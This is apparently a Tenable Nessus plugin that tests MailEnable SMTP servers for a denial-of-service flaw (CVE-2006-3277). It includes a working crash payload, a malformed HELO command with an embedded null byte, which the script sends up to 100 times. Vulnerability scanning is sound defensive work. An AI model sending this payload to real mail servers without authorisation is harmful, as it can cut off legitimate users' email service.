#
# (C) Tenable Network Security
#


if (description)
{
  script_id(21771);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-3277");
  script_bugtraq_id(18630);
  script_xref(name:"OSVDB", value:"26791");

  script_name(english:"MailEnable SMTP Server HELO Command Denial of Service Vulnerability");
  script_summary(english:"Tries to crash MailEnable SMTP server");

  desc = "
Synopsis :

The remote SMTP server is susceptible to a denial of service attack. 

Description :

The remote host is running MailEnable, a commercial mail server for
Windows. 

According to the version number in its banner, the SMTP server bundled
with the installation of MailEnable on the remote host will crash when
handling malformed HELO commands.  An unauthenticated attacker may be
able to leverage this issue to deny service to legitimate users. 

See also : 

http://www.divisionbyzero.be/?p=173
http://www.securityfocus.com/archive/1/438374/30/0/threaded
http://www.divisionbyzero.be/?p=174
http://lists.grok.org.uk/pipermail/full-disclosure/2006-June/047443.html
http://www.mailenable.com/hotfix/

Solution : 

Apply the ME-10013 hotfix referenced in the vendor link above. 

Risk factor : 

Low / CVSS Base Score : 2 
(AV:R/AC:L/Au:NR/C:N/A:P/I:N/B:N)";
  script_description(english:desc);
 
  script_category(ACT_DENIAL);
  script_family(english:"Denial of Service");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencie("smtpserver_detect.nasl");
  script_require_ports("Services/smtp", 25);
  script_exclude_keys("SMTP/wrapped");

  exit(0);
}


include("global_settings.inc");
include("smtp_func.inc");


if ( report_paranoia < 2 ) exit(0); # FPs
port = get_kb_item("Services/smtp");
if (!port) port = 25;
if (!get_port_state(port)) exit(0);
if (get_kb_item('SMTP/'+port+'/broken')) exit(0);


# Make sure the banner corresponds to MailEnable.
banner = get_smtp_banner(port:port);
if (
  !banner || 
  !egrep(pattern:"Mail(Enable| Enable SMTP) Service", string:banner)
) exit(0);


# Try to crash the daemon.
c = raw_string("HELO ", raw_string(0), "x99\r\n");

failed = 0;
tries = 100;
for (iter=1; iter <= tries; iter++)
{
  # Try to crash the daemon.
  soc = open_sock_tcp(port);
  if (soc)
  {
    failed = 0;
    send(socket:soc, data:c);
    close(soc);
  }
  else
  {
    sleep(1);

    # Call it a problem if we see three consequetive failures to connect.
    if (++failed > 2)
    {
        security_note(port);
        exit(0);
    }
  }
}
